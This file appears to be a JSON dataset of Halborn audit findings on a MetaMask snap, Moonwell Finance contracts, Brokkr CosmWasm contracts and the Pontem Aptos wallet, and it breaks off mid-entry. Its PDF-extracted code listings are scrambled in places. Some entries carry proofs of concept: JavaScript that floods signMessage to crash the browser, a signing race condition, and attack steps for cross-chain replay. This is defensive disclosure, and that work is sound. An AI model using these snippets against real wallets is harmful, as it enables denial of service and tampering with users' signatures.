        "body": "Metamask snap applications are protected by default by Metamask, which will control which origins can communicate with each installed snap. However, with some social engineering, an attacker could manage to con- vince a user to provide access to a malicious origin, so it can manage to call the Rarimos Snap App endpoints. This could be made impossible if the snap could only allow verified origins to communicate with it. Risk Level: Likelihood - 1 Impact - 1 Recommendation: If possible, only allow to communicate with the snap web origins that are verified and specified in a white-list. If Rarimo does not expect third-parties websites to be communicating with the snap, only the known Rarimo websites using the snap should be allowed. Remediation Plan: ACKNOWLEDGED: The Rarimo team considered that third-party websites should be able to use their snap app and therefore will not be implementing this protection. 22 THANK YOU FOR CHOOSING",
        "labels": [
            "Halborn",
            "Rarimo_Snap_App_WebApp_Pentest",
            "Severity: Informational"
        ]
    },
    {
        "title": "SILENT FAILURE DURING TOKEN MINTING ON THE ROUTER CONTRACT",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Moonwell_Finance_Contracts_V2_Smart_Contract_Security_Assessment_Report_Halborn_Final.pdf",
        "body": "The mToken.mint(msg.value); function, originating from Compounds ERC20 mToken contracts, is a call that does not revert on failure but returns an error code as a uint value instead. This behavior deviates from the standard expected of typical Solidity functions that revert on failure. This non-standard behavior makes it difficult for calling contracts (like the one above) to correctly handle failures. As the above contract does not check the return value of mToken.mint(), failures in this function will not cause the overall transaction to revert. This could lead to serious imbalances between the perceived balance of mTokens on the router contract and the actual supply of minted mTokens. Code Location: Listing 1 1 2 3 4 5 6 7 8 9 10 11 12 // / @notice Deposit ETH into the Moonwell protocol // / @param recipient The address to receive the mToken function mint ( address recipient ) external payable { weth . deposit { value : msg . value }() ; mToken . mint ( msg . value ); IERC20 ( address ( mToken )) . safeTransfer ( recipient , mToken . balanceOf ( address ( this )) ); } 23 Proof Of Concept: Step 1 : An external actor calls the mint() function, sending some ETH along with the transaction. Step 2 : The function attempts to convert the sent ETH to WETH by calling weth.deposit{value: msg.value}();. Step 3 : The contract calls mToken.mint(msg.value);, but this operation fails for some reason. However, instead of reverting the transaction, mToken.mint() returns an error code. Step 4 : Ignoring the failure from mToken.mint(), the contract proceeds to IERC20(address(mToken)).safeTransfer(recipient, mToken.balanceOf( address(this)));. BVSS: AO:A/AC:L/AX:L/C:N/I:H/A:H/D:H/Y:H/R:P/S:C (8.2) Recommendation: Ensure that mToken.mint() is successful before transferring tokens. Remediation Plan: SOLVED: The Moonwell Finance team solved the issue by adding the return value validation. Commit ID: c39f98bdc9dd4e448ba585923034af1d47f74dfa 24 ",
        "labels": [
            "Halborn",
            "Moonwell_Finance_Contracts_V2",
            "Severity: High"
        ]
    },
    {
        "title": "SILENT FAILURE DURING TOKEN REDEMPTION ON THE ROUTER CONTRACT",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Moonwell_Finance_Contracts_V2_Smart_Contract_Security_Assessment_Report_Halborn_Final.pdf",
        "body": "In the router contract, The redeem function aims to redeem mTokens equiv- alent to mTokenRedeemAmount. The call mToken.redeem(mTokenRedeemAmount); is responsible for the redemption action. In the event of an error, the mToken.redeem() function from Compound's mToken contract does not revert, but instead returns a non-zero error code as an uint. This behavior deviates from the standard Solidity function behavior that typically reverts in case of an error. The redeem() function in the MTOKEN contract does not check the return value of mToken.redeem(mTokenRedeemAmount);. If this redemption opera- tion fails (returns a non-zero error code), the contract still proceeds with the remaining operations, leading to a silent failure. As a result, the contract behaves as if tokens were redeemed when they were not, cre- ating a discrepancy between the actual and perceived balance of mtokens and eth. Code Location: Listing 2 function redeem ( uint256 mTokenRedeemAmount , address recipient ) 1  external { 2 3 4 5 6 7 8 9 ); IERC20 ( address ( mToken )) . safeTransferFrom ( msg . sender , address ( this ) , mTokenRedeemAmount mToken . redeem ( mTokenRedeemAmount ); 25 10 11 12 13 14 15 16 } weth . withdraw ( weth . balanceOf ( address ( this ))) ; ( bool success , ) = payable ( recipient ). call { value : address ( this ). balance }( \" \" ); require ( success , \" WETHRouter : ETH transfer failed \"); Proof Of Concept: Step 1 : An external actor (say, an address A) calls the redeem() function with a certain mTokenRedeemAmount and recipient. Step 2 : The function starts by transferring mTokenRedeemAmount of This is done via the mTokens from A to the contract itself. IERC20(address(mToken)).safeTransferFrom(msg.sender, address(this), mTokenRedeemAmount); statement. Step 3 : Next, the function attempts to redeem the mTokens that have just been transferred to the contract, using mToken.redeem(mTokenRedeemAmount );. But, for some reason, this redemption fails. In normal circumstances, this failure should cause the transaction to revert. However, due to the atypical behavior of the mToken.redeem() method (it does not revert on failure but returns a non-zero uint instead), the execution continues to the next line. Step 4 : Now, the contract attempts to convert its entire WETH balance to ETH via weth.withdraw(weth.balanceOf(address(this)));. Since the re- demption in step 3 failed, this step should not result in any additional ETH being added to the contract. However, lets assume that the contract already had some ETH balance before the transaction began. Step 5 : The contract then tries to transfer its entire ETH balance to the recipient specified in step 1. Despite the failed redemption, the function ends up transferring the contracts existing ETH balance to the recipient. 26 BVSS: AO:A/AC:L/AX:L/C:N/I:H/A:H/D:H/Y:H/R:P/S:C (8.2) Recommendation: Ensure that mToken.redeem() is successful before transferring tokens. Remediation Plan: SOLVED: The Moonwell Finance team solved the issue by adding the return value validation. Commit ID: c39f98bdc9dd4e448ba585923034af1d47f74dfa 27 ",
        "labels": [
            "Halborn",
            "Moonwell_Finance_Contracts_V2",
            "Severity: High"
        ]
    },
    {
        "title": "MINT WITH PERMIT CAN BE BROKEN WHEN USING TOKENS THAT DO NOT FOLLOW THE ERC2612 STANDARD",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Moonwell_Finance_Contracts_V2_Smart_Contract_Security_Assessment_Report_Halborn_Final.pdf",
        "body": "In the mintWithPermit function, the implementation invokes the underlying tokens permit() function and proceeds with the assumption that the operation was successful, without verifying the outcome. However, certain tokens may not adhere to the IERC20Permit standard. For example, the DAI Stablecoin utilizes a permit() function that deviates from the reference implementation. This lack of verification may lead to inconsistencies and unexpected behavior when interacting with non-conforming tokens. Code Location: Listing 3 function mintWithPermit ( uint mintAmount , uint deadline , uint8 v , bytes32 r , bytes32 s ) override external returns ( uint ) { // Go submit our pre - approval signature data to the IERC20Permit ( underlying ). permit ( msg . sender , address ( this ) , mintAmount , deadline , v , r , s ); ( uint err ,) = mintInternal ( mintAmount ); return err ; 1 2 3 4 5 6 7  underlying token 8 9 10 11 12 13 14 15 } 28 Proof Of Concept: DAI Code Listing 4 { bytes32 digest = 1 pragma solidity =0.5.12; 2 3 contract Dai is LibNote { 4 5 6  , uint256 expiry , 7  external 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22  - permit \" ); 23  ); 24 25 26 27 28 29 } )); } // --- Approve by signature --- function permit ( address holder , address spender , uint256 nonce bool allowed , uint8 v , bytes32 r , bytes32 s ) keccak256 ( abi . encodePacked ( \" \\ x19 \\ x01 \" , DOMAIN_SEPARATOR , keccak256 ( abi . encode ( PERMIT_TYPEHASH , holder , spender , nonce , expiry , allowed )) require ( holder != address (0) , \" Dai / invalid - address -0 \"); require ( holder == ecrecover ( digest , v , r , s ) , \" Dai / invalid require ( expiry == 0 || now <= expiry , \" Dai / permit - expired \" require ( nonce == nonces [ holder ]++ , \" Dai / invalid - nonce \" ); uint wad = allowed ? uint ( -1) : 0; allowance [ holder ][ spender ] = wad ; emit Approval ( holder , spender , wad ); 29 BVSS: AO:A/AC:M/AX:M/C:L/I:C/A:N/D:L/Y:L/R:N/S:C (6.7) Recommendation: Add proper verification to the permit() function call. After calling the permit() function, ensure that the operation was successful before proceeding with the minting process. Remediation Plan: SOLVED: The Moonwell Finance team solved the issue by using the safePermit function. 30 ",
        "labels": [
            "Halborn",
            "Moonwell_Finance_Contracts_V2",
            "Severity: Medium"
        ]
    },
    {
        "title": "LACK OF END TIME VALIDATION LEADS TO WRONG MARKET INDEX CALCULATION ON THE NEW MARKETS",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Moonwell_Finance_Contracts_V2_Smart_Contract_Security_Assessment_Report_Halborn_Final.pdf",
        "body": "In the _addEmissionConfig function, which is responsible for creating new market emission configurations, there is no validation check for the _endTime parameter. This oversight may lead to the creation of markets with incorrect or unreasonable end times, resulting in wrong market index calculations and potentially impacting the overall functioning of the system. Code Location: Listing 5 1 2 3 4 5 6 7 8 9 10 11 12 ... 13 14 15 16 17 18 19  at function _addEmissionConfig ( MToken _mToken , address _owner , address _emissionToken , uint _supplyEmissionPerSec , uint _borrowEmissionsPerSec , uint _endTime ) external { requireComptrollersAdmin () ; MarketConfig memory config = MarketConfig ({ // Set the owner of the reward distributor config owner : _owner , // Set the emission token address emissionToken : _emissionToken , // Set the time that the emission campaign should end 31 endTime : _endTime , 20 21 22 23  timestamp exceeds 32 bits \" ) , 24 25 26 27  timestamp exceeds 32 bits \" ) , 28 29 30 31 32 33 34 ... 35 }) ; } // Initialize the global supply supplyGlobalTimestamp : safe32 ( block . timestamp , \" block supplyGlobalIndex : initialIndexConstant , // Initialize the global borrow index + timestamp borrowGlobalTimestamp : safe32 ( block . timestamp , \" block borrowGlobalIndex : initialIndexConstant , // Set supply and reward borrow speeds supplyEmissionsPerSec : _supplyEmissionPerSec , borrowEmissionsPerSec : _borrowEmissionsPerSec Proof Of Concept: Listing 6 MultiRewardDistributor distributorHarness = new function createDistributorWithRoundValuesAndConfig ( uint faucetToken . allocateTo ( address ( this ) , tokensToMint ); faucetToken . approve ( address ( mToken ) , tokensToMint ); 1  tokensToMint , uint supplyEmissionsPerSecond , uint  borrowEmissionsPerSecond ) internal returns ( MultiRewardDistributor  distributor ) { 2 3 4 5  MultiRewardDistributor ( 6 7 8 9 10 11 12 13  e18 ); 14 // Add config + send emission tokens emissionToken . allocateTo ( address ( distributorHarness ) , 100 // 1 year of rewards uint endTime = block . timestamp - (60 * 60 * 24 * 365) ; distributorHarness . _addEmissionConfig ( address ( comptroller ) , address ( this ) ); 32 15 16 17 18 19 20 21 22 23 24 mToken , address ( this ) , address ( emissionToken ) , supplyEmissionsPerSecond , borrowEmissionsPerSecond , endTime ); return distributorHarness ; } BVSS: AO:A/AC:L/AX:L/C:M/I:M/A:L/D:H/Y:H/R:P/S:U (6.2) Recommendation: To address this issue, consider adding a validation check within the _addEmissionConfig function to ensure that the _endTime parameter is valid and reasonable. The check should verify that _endTime is greater than the current block timestamp. Remediation Plan: SOLVED: The Moonwell Finance team solved the issue by adding the _endTime validation. 33 ",
        "labels": [
            "Halborn",
            "Moonwell_Finance_Contracts_V2",
            "Severity: Medium"
        ]
    },
    {
        "title": "MISSING CHAIN ID AND RECEIVER ADDRESS VERIFICATION IN EXECUTEPROPOSAL(",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Moonwell_Finance_Contracts_V2_Smart_Contract_Security_Assessment_Report_Halborn_Final.pdf",
        "body": "The executeProposal() function in the current smart contract is responsi- ble for parsing and verifying VAAs (Validators Aggregated Attestations) and then executing transactions based on these VAAs. The function does not verify the Chain ID or the receiver address (recipient of the trans- action). The absence of chain ID and receiver address verification could lead to significant security issues. Since the chain ID and recipient address are not checked, an attacker can craft a VAA to target an address on another chain, causing a cross-chain replay attack. Code Location: Listing 7 function _executeProposal ( bytes memory VAA , bool overrideDelay ) // This call accepts single VAAs and headless VAAs ( IWormhole . VM memory vm , bool valid , string memory reason ) = wormholeBridge . parseAndVerifyVM ( VAA ); require ( valid , reason ); // / ensure VAA parsing 1  private { 2 3 4 5 6 7 8 9  verification succeeded 10 11 12 13 require ( if (! overrideDelay ) { queuedTransactions [ vm . hash ]. queueTime != 0 , 34 \" TemporalGovernor : tx not queued \" queuedTransactions [ vm . hash ]. queueTime + block . timestamp , \" TemporalGovernor : timelock not finished \" } else if ( queuedTransactions [ vm . hash ]. queueTime == 0) { // / if queue time is 0 due to fast track execution , queuedTransactions [ vm . hash ]. queueTime = block . } ); ); require ( ); require ( 14 15 16 17  proposalDelay <= 18 19 20 21 22  set it to current block timestamp 23  timestamp . toUint248 () ; 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52  revert with the error bubbling up 53 // / Interaction ( s ) ); ! queuedTransactions [ vm . hash ]. executed , \" TemporalGovernor : tx already executed \" queuedTransactions [ vm . hash ]. executed = true ; address [] memory targets ; // / contracts to call uint256 [] memory values ; // / native token amount to send bytes [] memory calldatas ; // / calldata to send (, targets , values , calldatas ) = abi . decode ( vm . payload , ( address , address [] , uint256 [] , bytes []) _sanityCheckPayload ( targets , values , calldatas ); for ( uint256 i = 0; i < targets . length ; i ++) { address target = targets [ i ]; uint256 value = values [ i ]; bytes memory data = calldatas [ i ]; // Go make our call , and if it is not successful ( bool success , bytes memory returnData ) = target . call { 35 data );  value : value }( 54 55 56 57 58 59 60 61 62 } } // / revert on failure with error message if any require ( success , string ( returnData )); emit ExecutedTransaction ( target , value , data ); Proof Of Concept: Step 1 : An attacker crafts a wormhole message that appears to be valid but is intended for a different chain (different chain ID) or is directed to an unintended recipient address. Step 2 : The attacker submits this crafted payload to the _executeProposal () function in the smart contract. Step 3 : Since there are no checks in place for the chain ID or recipient address, the function treats the VAA as valid and begins to execute the transaction(s) specified in the VAA payload. BVSS: AO:A/AC:L/AX:L/C:N/I:H/A:H/D:N/Y:N/R:P/S:C (5.9) Recommendation: Consider checking emitter Chain id, receiver on the function. Remediation Plan: SOLVED: The Moonwell Finance team solved the issue by adding the necessary validations. 36 Commit ID: c39f98bdc9dd4e448ba585923034af1d47f74dfa 37 ",
        "labels": [
            "Halborn",
            "Moonwell_Finance_Contracts_V2",
            "Severity: Medium"
        ]
    },
    {
        "title": "WRONG EVENT IS EMITTED IN THE UPDATE BORROW SPEED FUNCTION",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Moonwell_Finance_Contracts_V2_Smart_Contract_Security_Assessment_Report_Halborn_Final.pdf",
        "body": "The _updateBorrowSpeed function in the smart contract is responsible for updating the borrow emission speed for the specified MToken and However, it has been identified that the wrong event emissionToken. is being emitted at the end of the function. The current implemen- tation emits the NewSupplyRewardSpeed event instead of the expected NewBorrowRewardSpeed event. This discrepancy can lead to confusion and incorrect data being captured by event listeners, potentially impacting the systems overall efficiency, accuracy, and traceability. Code Location: Listing 8 // / @notice Update the borrow emissions for a given mtoken , function _updateBorrowSpeed ( MToken _mToken , address MarketEmissionConfig storage emissionConfig = 1  emission token pair . 2  _emissionToken , uint _newBorrowSpeed ) public { 3  fetchConfigByEmissionToken ( _mToken , _emissionToken ); 4 5 6 7 8  borrowEmissionsPerSec ; 9 10  new borrow emissions to be equal to current !\" ); 11  borrow reward speed higher than the emission cap ! \"); // Safety check this is the owner or the admin requireEmissionConfigOwnerOrAdmin ( emissionConfig ); uint currentBorrowSpeed = emissionConfig . config . require ( _newBorrowSpeed < emissionCap , \" Cannot set a require ( _newBorrowSpeed != currentBorrowSpeed , \" Can 't set 38 // Make sure we update our indices before setting the new updateMarketBorrowIndexInternal ( _mToken ); // Update borrow speed emissionConfig . config . borrowEmissionsPerSec = 12 13  speed 14 15 16 17  _newBorrowSpeed ; 18 19  currentBorrowSpeed , _newBorrowSpeed ); 20 } emit NewSupplyRewardSpeed ( _mToken , _emissionToken , BVSS: AO:A/AC:L/AX:L/C:M/I:M/A:L/D:N/Y:N/R:P/S:U (3.4) Recommendation: To address this issue, It is recommended to update the _updateBorrowSpeed function to emit the correct event, NewBorrowRewardSpeed, instead of the current NewSupplyRewardSpeed event. Remediation Plan: SOLVED: The Moonwell Finance team solved the issue by changing the event. 39 ",
        "labels": [
            "Halborn",
            "Moonwell_Finance_Contracts_V2",
            "Severity: Low"
        ]
    },
    {
        "title": "EMISSIONCAP LACKS AN UPPER BOUND, LEADING TO POTENTIAL OVERFLOWS",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Moonwell_Finance_Contracts_V2_Smart_Contract_Security_Assessment_Report_Halborn_Final.pdf",
        "body": "The emissionCap variable in the given smart contract does not have an upper bound in the _setEmissionCap function. By default, the emission cap is set to 100 * 10^18 tokens per second to avoid unbounded compu- tation/multiplication overflows. However, the function _setEmissionCap allows changing the emissionCap value without any restriction on the up- per limit, which can potentially lead to overflows and other unexpected issues in the contracts execution. Code Location: Listing 9 function _setEmissionCap ( uint _newEmissionCap ) external { requireComptrollersAdmin () ; uint oldEmissionCap = emissionCap ; emissionCap = _newEmissionCap ; emit NewEmissionCap ( oldEmissionCap , _newEmissionCap ); } 1 2 3 4 5 6 7 8 9 BVSS: AO:A/AC:L/AX:L/C:M/I:M/A:L/D:N/Y:N/R:P/S:U (3.4) 40 Recommendation: To address this issue, consider implementing an upper bound for the emissionCap. Modify the _setEmissionCap function to include an additional require statement that checks if the new value for the emission cap is within a predefined safe range. Remediation Plan: RISK ACCEPTED: The Moonwell Finance team accepted the risk of this issue. 41 ",
        "labels": [
            "Halborn",
            "Moonwell_Finance_Contracts_V2",
            "Severity: Low"
        ]
    },
    {
        "title": "UNRESTRICTED RECEIVE IN WETHROUTER ENABLES EXCESS REDEMPTIONS",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Moonwell_Finance_Contracts_V2_Smart_Contract_Security_Assessment_Report_Halborn_Final.pdf",
        "body": "The redeem() function in the current design of the WETHRouter smart contract is designed to handle the redemption of mToken and subsequent withdrawal of WETH. However, this function does not restrict the receipt of tokens to only WETH/mToken. As a result, any native token sent directly to the WETHRouter contract will be sent to the first redeemer. In this setup, an unintentional or malicious transfer of arbitrary tokens to the WETHRouter contract could lead to an unexpected balance increase. When the redeem() function is called, it attempts to withdraw all ETH equivalent in the contract and sends it to the recipient. If an arbitrary amount of tokens or native ETH is sent to the contract, it would inflate the balance available for withdrawal, making it retrievable by the first redeemer. Code Location: Listing 10 function redeem ( uint256 mTokenRedeemAmount , address recipient ) 1  external { 2 3 4 5 6 7 8 9 10 11 12 13 ); IERC20 ( address ( mToken )) . safeTransferFrom ( msg . sender , address ( this ) , mTokenRedeemAmount mToken . redeem (100 ether ); weth . withdraw ( weth . balanceOf ( address ( this ))) ; ( bool success , ) = payable ( recipient ). call { value : address ( this ). balance 42 }( \" \" ); require ( success , \" WETHRouter : ETH transfer failed \"); } receive () external payable {} 14 15 16 17 18 BVSS: AO:A/AC:L/AX:L/C:N/I:N/A:N/D:M/Y:N/R:P/S:C (3.1) Recommendation: A potential solution could be to add a mechanism that isolates the withdrawal of mToken-generated WETH from the withdrawal of other tokens that might be sent to the contract. This could be achieved by storing the contracts balance before and after the mToken redemption and only allowing the withdrawal of the difference. Remediation Plan: SOLVED: The Moonwell Finance team solved the issue by adding an address validation. 43 ",
        "labels": [
            "Halborn",
            "Moonwell_Finance_Contracts_V2",
            "Severity: Low"
        ]
    },
    {
        "title": "IMPLEMENTATIONS CAN BE INITIALIZED",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Moonwell_Finance_Contracts_V2_Smart_Contract_Security_Assessment_Report_Halborn_Final.pdf",
        "body": "The contracts are upgradable, inheriting from the Initializable contract. However, the current implementations are missing the _disableInitializers () function call in the constructors. Thus, an attacker can initialize the implementation. Usually, the initialized implementation has no direct impact on the proxy itself; however, it can be exploited in a phishing attack. In rare cases, the implementation might be mutable and may have an impact on the proxy. BVSS: AO:A/AC:L/AX:M/C:N/I:L/A:N/D:L/Y:L/R:N/S:U (2.5) Recommendation: It is recommended to call _disableInitializers within the contracts constructor to prevent the implementation from being initialized. Remediation Plan: SOLVED: The contracts now implement the _disableInitializers() function call in the constructors. Commit ID: c39f98bdc9dd4e448ba585923034af1d47f74dfa 44 4.10 (HAL-10) HARD-CODED MTOKEN ADDRESS IN WETHUNWRAPPER CONTRACT - LOW (2.5) ",
        "labels": [
            "Halborn",
            "Moonwell_Finance_Contracts_V2",
            "Severity: Informational"
        ]
    },
    {
        "title": "LACK OF ADDRESS NORMALIZATION",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/CosmWasm Smart Contract Audits/Brokkr_Protocol_Long_Term_Bonding_CosmWasm_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "The multiple features of the bonding-v1 and staking-v1 contracts do not consider that Terra addresses are valid both upper and all lower case. Although valid, a strict comparison between the same address in its all uppercase version (e.g.: TERRA1KG. . . XNL8) and its all lowercase version (e.g.: terra1kg. . . xnl8) failure. The likelihood of this issue was reduced as the affected functions were owner-only functionalities, therefore much less prone to error, or queries. Queries affected by this issue will only cause inconvenience rather than a security issue. Undesired situations could occur, such as loss of control over the de- pendent contract addresses in case of instantiation with a misvalidated address made up of capital letters. Since update_config does not provide an option for changing some addresses of the contracts, the administrator will lose access to contract management. Code Location: Listing 1: contracts/staking-v1/src/contract.rs (Lines 60,61,62,63) deps : DepsMut , env : Env , _info : MessageInfo , msg : InstantiateMsg , 43 pub fn instantiate ( 44 45 46 47 48 ) -> Result < Response , ContractError > { 49  CONTRACT_VERSION ) ?; 50 51  community_bonding_contract { 52 let community_bonding_contract = if let Some ( addr ) = msg . Some ( deps . api . addr_canonicalize (& addr ) ?) set_contract_version ( deps . storage , CONTRACT_NAME , 11 }; } else { None let config = Config { 53 54 55 56 57 58 59 60 61  rewards_pool_contract )? , 62  bbro_minter_contract )? , 63  epoch_manager_contract )? , 64 65 66 67 68  , 69  , 70 71 72 73 74 }, }; owner : deps . api . addr_canonicalize (& msg . owner )? , paused : false , bro_token : deps . api . addr_canonicalize (& msg . bro_token )? , rewards_pool_contract : deps . api . addr_canonicalize (& msg . bbro_minter_contract : deps . api . addr_canonicalize (& msg . epoch_manager_contract : deps . api . addr_canonicalize (& msg . community_bonding_contract , unstake_period_blocks : msg . unstake_period_blocks , min_staking_amount : msg . min_staking_amount , lockup_config : LockupConfig { min_lockup_period_epochs : msg . min_lockup_period_epochs max_lockup_period_epochs : msg . max_lockup_period_epochs base_rate : msg . base_rate , linear_growth : msg . linear_growth , exponential_growth : msg . exponential_growth , The update_config function from staking-v1/src/commands.rs does not pro- vide the possibility of changing the above contract addresses. The only address that can be updated is community_bonding_contract: Listing 2: contracts/staking-v1/src/commands.rs (Line 575) 565 pub fn update_config ( 566 567 568 569 570 571 572 573 deps : DepsMut , paused : Option < bool >, unstake_period_blocks : Option < u64 >, min_staking_amount : Option < Uint128 >, min_lockup_period_epochs : Option < u64 >, max_lockup_period_epochs : Option < u64 >, base_rate : Option < Decimal >, linear_growth : Option < Decimal >, 12 574 575 576 ) -> Result < Response , ContractError > exponential_growth : Option < Decimal >, community_bonding_contract : Option < String >, The above-mentioned lack of normalization was also noted in the following lines of the contracts: Listing 3: Affected resources 1 contracts / bonding - v1 / src / commands . rs : #346 , 354 , 362 , 370 , 445 ,  477 Risk Level: Likelihood - 1 Impact - 3 Recommendation: One of the two approaches detailed below should be used:  Update the cosmwasm-vm and use cosmwasm_std::Api::addr_validate (reference CWA-2022-002).  If the update mentioned is not possible, addresses could be stored in canonical format by using the cosmwasm_std::Api::addr_canonicalize utility function. The following considerations should be considered when implementing the second option:  To successfully compare a canonical address, both ends should be in canonical format. For example, when performing access controls, the sender (e.g.: info.sender or env.message.sender) should be canoni- calized beforehand too. 13  To send funds to a canonicalized address or include them into a message to a different contract, they should be first turn into its human-readable format via the cosmwasm_std::Api::addr_humanize utility function Remediation plan: RISK ACCEPTED: The Brokkr team decided not to take action on this finding because the affected functionalities were only available to the contract owner. 14 ",
        "labels": [
            "Halborn",
            "Brokkr_Protocol_Long_Term_Bonding_CosmWasm",
            "Severity: Low"
        ]
    },
    {
        "title": "UNMANTAINED DEPENDENCY",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/CosmWasm Smart Contract Audits/Brokkr_Protocol_Long_Term_Bonding_CosmWasm_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "Halborn used automated security scanners to assist with detection of well-known security issues and vulnerabilities. Among the tools used was cargo audit, a security scanner for vulnerabilities reported to the RustSec Advisory Database. All vulnerabilities published in https:// crates.io are stored in a repository named The RustSec Advisory Database. cargo audit is a human-readable version of the advisory database which performs a scanning on Cargo.lock. Security Detections are only in scope. To better assist the developers maintaining this code, the auditors are including the output with the dependencies tree, and this is included in the cargo audit output to better know the dependencies affected by unmaintained and vulnerable crates. ID RUSTSEC-2020-0025 package bigint Short Description biginit is unmaintained, use uint instead Code Location: Listing 4: Dependency tree 1 bigint 4.4.3 2 3 4 cosmwasm - bignumber 2.2.0 brotocol - staking - v1 1.1.0 brotocol - oracle 1.0.0 Risk Level: Likelihood - 1 Impact - 1 15 Recommendation: Beware of using dependencies and packages that are no longer supported by the developers or have publicly known security flaws, even when not exploitable at the moment. Remediation plan: ACKNOWLEDGED: The Brokkr team acknowledged this finding. 16 THANK YOU FOR CHOOSING",
        "labels": [
            "Halborn",
            "Brokkr_Protocol_Long_Term_Bonding_CosmWasm",
            "Severity: Informational"
        ]
    },
    {
        "title": "CONFIDENTIAL DATA ACCESSIBLE ON THE CLIPBOARD",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Web Pentest/Pontem_Network_Aptos_Wallet_WebApp_Pentest_Report_Halborn_Final.pdf",
        "body": "The Aptos wallet could allow an attacker to obtain the mnemonic passphrase from the clipboard storage. The attack paths could be considered local A Python script or other process could have access to and remote. the clipboard and obtain this sensitive information. Additionally, a malicious web page with clipboard access could be able to obtain the mnemonic passphrase and send it to the attacker. Evidences: PoC video: Mnemonic phrase leaked from clipboard using python script PoC video: Mnemonic phrase leaked from clipboard using web browser Risk Level: Likelihood - 5 Impact - 5 Recommendation: The export of the public and private key should not be done using the clipboard, which could be accessible from other processes. Additionally, disable the copy functionality of the passphrase. The extension should allow only to read the passphrase. 18 Remediation Plan: PENDING: The Pontem Network team stated that the recommendation will be followed in a future version of the code. Pontem Aptos Wallet may be at risk until the fixes have been reviewed and deployed. 19 ",
        "labels": [
            "Halborn",
            "Pontem_Network_Aptos_Wallet_WebApp_Pentest",
            "Severity: Critical"
        ]
    },
    {
        "title": "POTENTIAL MEMORY LEAK ON signMessage",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Web Pentest/Pontem_Network_Aptos_Wallet_WebApp_Pentest_Report_Halborn_Final.pdf",
        "body": "Pontem Aptos Wallet allowed an attacker to execute malicious code using the exported wallet functions, triggering a Denial of Service on the extension and the Browser (Chrome v105.0.5195.125). An attacker could use the malicious code to call the wallet (locked and unlocked) to trigger a Denial of Service on the browser, closing the running process. Proof of concept: Listing 1: Exploit window . pontem . signMessage ( ' Signed message ') . then ( result => { console . log (' Signed Message ' , result ) }) . catch ( e => console . log ( ' Error ' , e)) 1 async function sign () { 2 3 4 5 6 7 } 8 9 async function exploitDoS () { 10 11 12 13 } for ( i =0; i < 1000000; i ++) { sign () } Extension Denial-of-Service Browser Denial-of-Service 20 Risk Level: Likelihood - 5 Impact - 5 Recommendation: Improve the management of the calls to the exported functions, and in- troduce mechanisms to control multiple calls and memory in use. Remediation Plan: SOLVED: The issue was solved in the following GitHub Pull Request (Commit 45429fb617843ccfbbab62dec76c77a4001ea73d): Feature apt 643 #113 21 ",
        "labels": [
            "Halborn",
            "Pontem_Network_Aptos_Wallet_WebApp_Pentest",
            "Severity: Critical"
        ]
    },
    {
        "title": "RACE CONDITION ON SIGNED MESSAGE",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Web Pentest/Pontem_Network_Aptos_Wallet_WebApp_Pentest_Report_Halborn_Final.pdf",
        "body": "The SignMessage exported function allowed an attacker to abuse the func- tion and trigger a race condition state. The function did not control the function execution, allowing to execute multiple calls to the same function in a short period of time. This situation allowed an attacker to overwrite the content of the signed messages. Proof of concept: Listing 2: Exploit . then ( result => { . then ( result = > { console . log ( ' Signed Message ' , result ) }) . catch ( e => console . log ( ' Error ', e)) 1 async function exploitSign () { 2 for (i = 1; i <= 5; i ++) { 3 4 window . pontem . signMessage ( i) 5 6 7 8 9 } 10 11 window . pontem . signMessage ( ' Test1 ') 12 13 14 15 16 17 await new Promise ( r => setTimeout (r , 1000) ) ; 18 19 window . pontem . signMessage ( ' Test2 ') 20 21 22 23 24 } }) . catch ( e => console . log ( ' Error ', e)) }) . catch ( e => console . log ( ' Error ', e)) console . log ( ' Signed Message ' , result ) console . log ( ' Signed Message ' , result ) . then ( result => { 22 Race condition on the signed messages Risk Level: Likelihood - 5 Impact - 5 Recommendation: Implement a method to queue the messages to sign, or an add control inside the function to not execute the same code before finishing the previous one. Remediation Plan: SOLVED: The issue was solved in the following GitHub Pull Request (Commit 45429fb617843ccfbbab62dec76c77a4001ea73d): Feature apt 643 #113 23 ",
        "labels": [
            "Halborn",
            "Pontem_Network_Aptos_Wallet_WebApp_Pentest",
            "Severity: Critical"
        ]
    },
    {
        "title": "NO CONFIRMATION REQUIRED ON SIGNING MESSAGES",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Web Pentest/Pontem_Network_Aptos_Wallet_WebApp_Pentest_Report_Halborn_Final.pdf",
